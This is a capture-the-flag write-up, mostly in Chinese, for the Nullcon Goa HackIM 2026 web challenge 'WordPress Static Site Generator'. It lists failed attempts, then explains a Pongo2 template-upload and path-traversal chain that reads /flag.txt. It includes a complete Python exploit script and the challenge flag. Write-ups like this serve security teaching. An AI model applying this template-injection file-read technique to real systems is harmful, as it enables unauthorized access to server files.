---
title: "WordPress Static Site Generator - Nullcon Goa HackIM 2026 CTF"
category: "web"
subcategory: "lfi"
type: "writeup"
tags: ["web", "template-injection", "path-traversal", "xxe", "django", "base64", "wordpress", "lfi", "nullcon-goa-hackim-2026-ctf", "2026", "ctf-writeup"]
summary: "\\- Local directory: web/WordPressStaticSiteGenerator"
source:
  name: "CTFtime writeup #40547"
  url: "https://ctftime.org/writeup/40547"
ctf:
  name: "Nullcon Goa HackIM 2026 CTF"
  year: 2026
  challenge: "WordPress Static Site Generator"
---

## Metadata

- **CTF:** Nullcon Goa HackIM 2026 CTF
- **Task:** WordPress Static Site Generator
- **Author team:** 正规子群.AI
- **CTFtime tags:** web, template-injection, path-traversal
- **CTFtime:** <https://ctftime.org/writeup/40547>

---
## 114 WordPress Static Site Generator

\- Category: `web`  
\- Value: `215`  
\- Solves: `96`  
\- Solved by me: `True`  
\- Local directory: `web/WordPressStaticSiteGenerator`

### 题目描述  
> I wanted to convert my WordPress page into a static website, so I implemented a suitable tool... but can it protect /flag.txt?  
>  
> Author: @gehaxelt

### 连接信息  
\- `52.59.124.14:5001`

### 附件下载地址  
\- 无

### 内存布局  
\- 暂无可解析二进制 或 本题主要是非二进制方向

### WP  
# WordPressStaticSiteGenerator

\---

## 题目信息

\- 名称: WordPress Static Site Generator  
\- 类型: Web  
\- 目标: 获取服务器上的 `/flag.txt`  
\- 远程: `52.59.124.14:5001`

\---

## 初步分析

首页功能很简单:

1\. `POST /upload` 上传所谓的 WordPress XML  
2\. `POST /generate` 传入模板名并返回渲染后的 HTML

直接测试发现:

\- `template` 参数会被拼接到 `templates/<template>.html`  
\- 输入 `../` 时会触发服务端报错，说明存在路径拼接行为  
\- 会话 cookie `wp-session` 中包含 `id` 和 `uploaded_file`（可 base64 解析出明文字段）

\---

## 失败尝试记录

### 尝试 1: 直接模板穿越读取 `/flag.txt`

使用:

\- `template=../../../../../flag.txt`  
\- `template=/flag.txt`

结果: 失败。因为服务端固定追加 `.html`，实际访问的是 `.../flag.txt.html`。

### 尝试 2: XXE 注入

上传带 ` ...>` 的 XML。

结果: 失败。生成页面没有回显实体内容。

### 尝试 3: 上传文件名目录穿越

尝试上传 `filename=../../templates/hax.xml`。

结果: 失败。文件名被规整为 basename，无法直接写入 `templates/`。

\---

## 成功利用链

核心思路是两段式:

1\. 上传一个恶意模板文件（文件名 `pwn.html`，内容是 Pongo2 指令）  
2\. 利用 `template` 路径穿越去加载该上传文件并执行

上传后的文件实际位于:

`uploads/<session_id>/pwn.html`

其中 `<session_id>` 可从 `wp-session` cookie 解码得到。

然后调用:

`template=../uploads/<session_id>/pwn`

服务端拼接后是:

`templates/../uploads/<session_id>/pwn.html`

该路径有效，Pongo2 会执行我们上传的模板代码。

恶意模板内容:

```django  
{% include "/flag.txt" %}  
```

`include` 会把目标文件内容直接作为模板包含，最终响应即为 flag。

\---

## Flag

```text  
ENO{PONGO2_T3MPl4T3_1NJ3cT1on_!s_Fun_To00!}  
```

\---

## 复现步骤

1\. 运行:

```bash  
python3 solution/[solution.py](http://solution.py)  
```

2\. 预期输出:

```text  
ENO{PONGO2_T3MPl4T3_1NJ3cT1on_!s_Fun_To00!}  
```

\---

## 关键风险总结

\- 用户可控模板路径 + 目录穿越  
\- 上传目录可被模板加载器访问  
\- 模板引擎允许 `include` 任意文件路径

三者组合后形成稳定任意文件读取，直接泄露 `/flag.txt`。

### Exploit  
#### web/WordPressStaticSiteGenerator/solution/[solution.py](http://solution.py)

```python  
#!/usr/bin/env python3  
import argparse  
import base64  
import re  
import sys  
from typing import Optional

import requests

def extract_session_id_from_cookie(cookie_value: str) -> str:  
raw = base64.urlsafe_b64decode(cookie_value + "=" * (-len(cookie_value) % 4))  
parts = raw.split(b"|")  
if len(parts) < 2:  
raise ValueError("unexpected cookie format")  
inner = base64.urlsafe_b64decode(parts[1] + b"=" * (-len(parts[1]) % 4))  
m = re.search(rb"[0-9a-f]{32}", inner)  
if not m:  
raise ValueError("session id not found in cookie")  
return m.group(0).decode()

def solve(base_url: str, timeout: float = 10.0) -> str:  
s = requests.Session()

payload = '{% include "/flag.txt" %}\n'  
files = {  
"wordpress_xml": ("pwn.html", payload, "text/html"),  
}  
r = [s.post](http://s.post)(f"{base_url}/upload", files=files, timeout=timeout, allow_redirects=False)  
if r.status_code not in (302, 303):  
raise RuntimeError(f"upload failed: status={r.status_code}, body={r.text[:200]}")

cookie = s.cookies.get("wp-session")  
if not cookie:  
raise RuntimeError("missing wp-session cookie")  
sid = extract_session_id_from_cookie(cookie)

template_name = f"../uploads/{sid}/pwn"  
r = [s.post](http://s.post)(  
f"{base_url}/generate",  
data={"template": template_name},  
timeout=timeout,  
)  
if r.status_code != 200:  
raise RuntimeError(f"generate failed: status={r.status_code}, body={r.text[:200]}")

body = r.text.strip()  
m = re.search(r"(?:flag|ENO)\\{[^}\n]+\\}", body)  
if m:  
return m.group(0)  
return body

def main() -> int:  
parser = argparse.ArgumentParser(description="Exploit WordPress Static Site Generator challenge")  
parser.add_argument("--host", default="52.59.124.14", help="target host")  
parser.add_argument("--port", default=5001, type=int, help="target port")  
parser.add_argument("--timeout", default=10.0, type=float, help="request timeout")  
args = parser.parse_args()

base_url = f"http://{args.host}:{args.port}"  
try:  
flag = solve(base_url, timeout=args.timeout)  
except Exception as exc:  
print(f"[!] exploit failed: {exc}", file=sys.stderr)  
return 1

print(flag)  
return 0

if __name__ == "__main__":  
raise SystemExit(main())  
```

\---
